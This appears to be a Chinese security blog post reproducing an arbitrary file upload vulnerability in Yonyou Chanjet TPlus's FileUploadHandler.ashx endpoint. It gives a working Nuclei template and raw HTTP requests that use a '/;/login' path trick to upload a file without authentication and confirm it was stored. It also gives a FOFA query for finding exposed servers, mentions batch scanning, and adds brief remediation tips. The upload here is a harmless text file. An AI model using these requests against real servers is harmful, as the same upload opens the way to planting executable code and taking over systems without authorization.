#  用友畅捷通-TPlus系统FileUploadHandler.ashx接口处存在文件上传漏洞【漏洞复现|附nuclei-POC】   
原创 kingkong  脚本小子   2024-11-21 00:30  
  
****  
**免责声明：**  
**本文内容仅供技术学习参考，请勿用于违法破坏。利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，与作者无关。如有侵权请联系删除。**  
  
****  
****  
**漏洞描述：**  
  
用友畅捷通-TPlus系统FileUploadHandler.ashx接口处存在文件上传漏洞。  
攻击者可通过上传包含恶意代码的文件到服务器，使恶意文件被执行，从而导致系统被入侵或遭受其他安全风险。  
  
  
01  
  
—  
  
**Nuclei POC**  
  
```
id: yongyou-changjietong-FileUploadHandler_ashx-fileupload

info:
  name: 用友畅捷通-TPlus系统FileUploadHandler.ashx接口处存在任意文件上传漏洞

  author: kingkong
  severity: high
  metadata:
    fofa-query: app="畅捷通-TPlus"
  reference:
    - https://mp.weixin.qq.com/s/k-F3dn3dVy45dXHVBROCjg
    - https://mp.weixin.qq.com/s/jAZ7AQShvTOr7RihTQwkZQ


http:
  - raw:
      - |
        POST /tplus/SM/SetupAccount/FileUploadHandler.ashx/;/login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Length: 180
        Content-Type: multipart/form-data; boundary=f95ec6be8c3acff8e3edd3d910d3b9a6

        --f95ec6be8c3acff8e3edd3d910d3b9a6
        Content-Disposition: form-data; name="file"; filename="test123.txt"
        Content-Type: image/jpeg

        test123
        --f95ec6be8c3acff8e3edd3d910d3b9a6--


      - |
        GET /tplus/UserFiles/test123.txt HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
              - 'status_code_1 == 200'
              - 'status_code_2 == 200'
              - 'contains(body_2,"test123")'
        condition: and


```  
  
  
02  
  
—  
  
搜索语法  
```
FOFA：app="畅捷通-TPlus"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneubibiaIicaogdDNqyve7j187tnNiaYzQb6gspjeMUC7tmXZqFhzM4lDARO9RRDK2w9ppmn2lHNnUE4g/640?wx_fmt=png&from=appmsg "")  
  
界面如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneubibiaIicaogdDNqyve7j187Xl5ibZicdJHFtyjPA37rWyT4WGns8WKfRA7l77vHb4y0ibdzmGhPCjr4w/640?wx_fmt=png&from=appmsg "")  
  
03  
  
—  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneubibiaIicaogdDNqyve7j187j4eTRUrDicts16wpDJ8OYxKiaTb6HIz7VdFUWaQAX9Cr71Fic38d7OBUg/640?wx_fmt=png&from=appmsg "")  
  
访问验证  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneubibiaIicaogdDNqyve7j18769RDGDB7IfljXyezo97xJ4hczRgGNljgNTxOZuqAkKs24qQRfl6rGg/640?wx_fmt=png&from=appmsg "")  
漏洞检测POC  
```
POST /tplus/SM/SetupAccount/FileUploadHandler.ashx/;/login HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 178
Content-Type: multipart/form-data; boundary=f95ec6be8c3acff8e3edd3d910d3b9a6

--f95ec6be8c3acff8e3edd3d910d3b9a6
Content-Disposition: form-data; name="file"; filename="test123.txt"
Content-Type: image/jpeg

test123
--f95ec6be8c3acff8e3edd3d910d3b9a6--


GET /tplus/UserFiles/test123.txt HTTP/1.1
Host: 
```  
  
  
neclei批量检测截图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneubibiaIicaogdDNqyve7j187a6BibAyL4ibh8x4gU9ich09J8KyBoLRhQPeeAFlvsUD2YpIGYaMeiamp5A/640?wx_fmt=png&from=appmsg "")  
  
  
04  
  
—  
  
修复建议  
  
  
1、文件类型验证：仅允许上传特定类型的文件，例如图像、文档等，并拒绝可执行文件或其他潜在的恶意文件类型。  
  
2、文件大小限制：限制上传文件的大小，以防止恶意用户上传过大的文件导致服务器资源耗尽。  
  
3、文件名处理：对上传的文件进行重命名，避免使用用户提供的文件名，以防止路径遍历攻击。  
  
05  
  
—  
  
下载地址  
  
  
进入公众号点击POC可获取所有POC文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneS7aOPfDNKhvOicibVlyrkJ3A4EuUx5c5S8eAxFnF9KiaibAGJfP6ibB6ze4Rm4pZ7MI4jQibT05lTevqg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
  
  
  
  
